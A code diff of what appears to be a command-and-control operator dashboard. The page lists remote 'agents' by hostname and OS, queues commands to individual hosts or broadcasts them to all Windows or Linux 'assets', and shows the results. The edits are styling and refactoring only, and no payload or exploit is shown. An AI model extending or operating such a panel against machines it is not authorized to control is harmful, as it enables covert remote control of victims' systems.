@@ -6,21 +6,20 @@
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
     <style>
         :root { --accent: #00ff41; --bg: #050505; --card: #111; --text: #e0e0e0; }
-        body { background: var(--bg); color: var(--text); font-family: 'Segoe UI', sans-serif; }
+        body { background: var(--bg); color: var(--text); font-family: 'Consolas', monospace; }
         .card { background: var(--card); border: 1px solid #333; border-radius: 4px; }
         .table { color: var(--text); font-size: 0.9rem; }
         .terminal-box { 
             background: #000; border: 1px solid #444; color: #fff; 
-            font-family: 'Consolas', monospace; font-size: 0.85rem;
-            height: 350px; overflow-y: auto; padding: 10px;
+            font-size: 0.85rem; height: 350px; overflow-y: auto; padding: 10px;
         }
         .status-online { color: var(--accent); text-shadow: 0 0 5px var(--accent); }
         .status-offline { color: #ff4444; }
         .badge-pending { color: #ff9800; border: 1px solid #ff9800; padding: 2px 5px; font-size: 0.7rem; }
         .text-neon { color: var(--accent); text-shadow: 0 0 5px var(--accent); }
+        .seen-text { color: #0dcaf0; font-size: 0.75rem; } /* Brighter Cyan for readability */
         pre { margin: 0; white-space: pre-wrap; color: #00ff41; }
         hr { border-color: #333; }
-        .filter-active { border-color: var(--accent) !important; box-shadow: 0 0 5px var(--accent); }
     </style>
 </head>
 <body class="p-4">
@@ -58,9 +57,9 @@
                     <form id="cmd-form">
                         <div class="input-group">
                             <select name="target" id="target-select" class="form-select bg-dark text-white" style="max-width: 250px;">
-                                <option value="ALL">📢 BROADCAST_ALL</option>
-                                <option value="BROADCAST_WINDOWS">🪟 BROADCAST_WINDOWS</option>
-                                <option value="BROADCAST_LINUX">🐧 BROADCAST_LINUX</option>
+                                <option value="ALL">BROADCAST_ALL</option>
+                                <option value="BROADCAST_WINDOWS">BROADCAST_WINDOWS</option>
+                                <option value="BROADCAST_LINUX">BROADCAST_LINUX</option>
                                 <optgroup label="WINDOWS_ASSETS" id="opt-windows"></optgroup>
                                 <optgroup label="LINUX_ASSETS" id="opt-linux"></optgroup>
                             </select>
@@ -96,9 +95,7 @@
         function applyFilters() {
             const query = document.getElementById('search-box').value.toLowerCase();
             const osType = document.getElementById('os-filter').value;
-            const items = document.querySelectorAll('.feed-item');
-
-            items.forEach(item => {
+            document.querySelectorAll('.feed-item').forEach(item => {
                 const text = item.innerText.toLowerCase();
                 const itemOS = item.getAttribute('data-os');
                 const matchesSearch = text.includes(query);
@@ -114,20 +111,15 @@
 
                 document.getElementById('agent-count').innerText = data.total_count;
 
-                // Update Select Menus
                 const selectWin = document.getElementById('opt-windows');
                 const selectLin = document.getElementById('opt-linux');
                 const table = document.getElementById('agent-table');
                 const savedVal = document.getElementById('target-select').value;
 
-                table.innerHTML = '';
-                selectWin.innerHTML = '';
-                selectLin.innerHTML = '';
+                table.innerHTML = ''; selectWin.innerHTML = ''; selectLin.innerHTML = '';
 
-                Object.values(data.agents).forEach(agent => {
-                    const isWin = agent.os.includes("Windows");
+                data.agents.forEach(agent => {
                     const statusClass = agent.status === "ONLINE" ? "status-online" : "status-offline";
-                    
                     table.innerHTML += `<tr>
                         <td><b>${agent.hostname}</b></td>
                         <td><small>${agent.os}</small></td>
@@ -137,7 +129,7 @@
                     </tr>`;
 
                     const opt = `<option value="${agent.hostname}">${agent.hostname}</option>`;
-                    if (isWin) selectWin.innerHTML += opt;
+                    if (agent.os.includes("Windows")) selectWin.innerHTML += opt;
                     else selectLin.innerHTML += opt;
                 });
                 document.getElementById('target-select').value = savedVal;
@@ -148,11 +140,11 @@
                 data.queue.forEach(task => {
                     qList.innerHTML += `<div class="mb-2">
                         <span class="badge-pending">TASK</span> <small class="text-info">${task.target}</small>: ${task.command}<br>
-                        <small class="text-muted">Seen by: ${task.seen_list.join(', ') || 'None'}</small><hr>
+                        <span class="seen-text">Seen by: ${task.seen_list.join(', ') || 'None'}</span><hr>
                     </div>`;
                 });
 
-                // Update Results with Filtering Support
+                // Update Results
                 const resFeed = document.getElementById('results-feed');
                 data.results.forEach(res => {
                     if (!seenResultIds.has(res.id)) {
@@ -169,7 +161,6 @@
                     }
                 });
                 applyFilters();
-
             } catch (e) { console.error("Poll error", e); }
         }
 
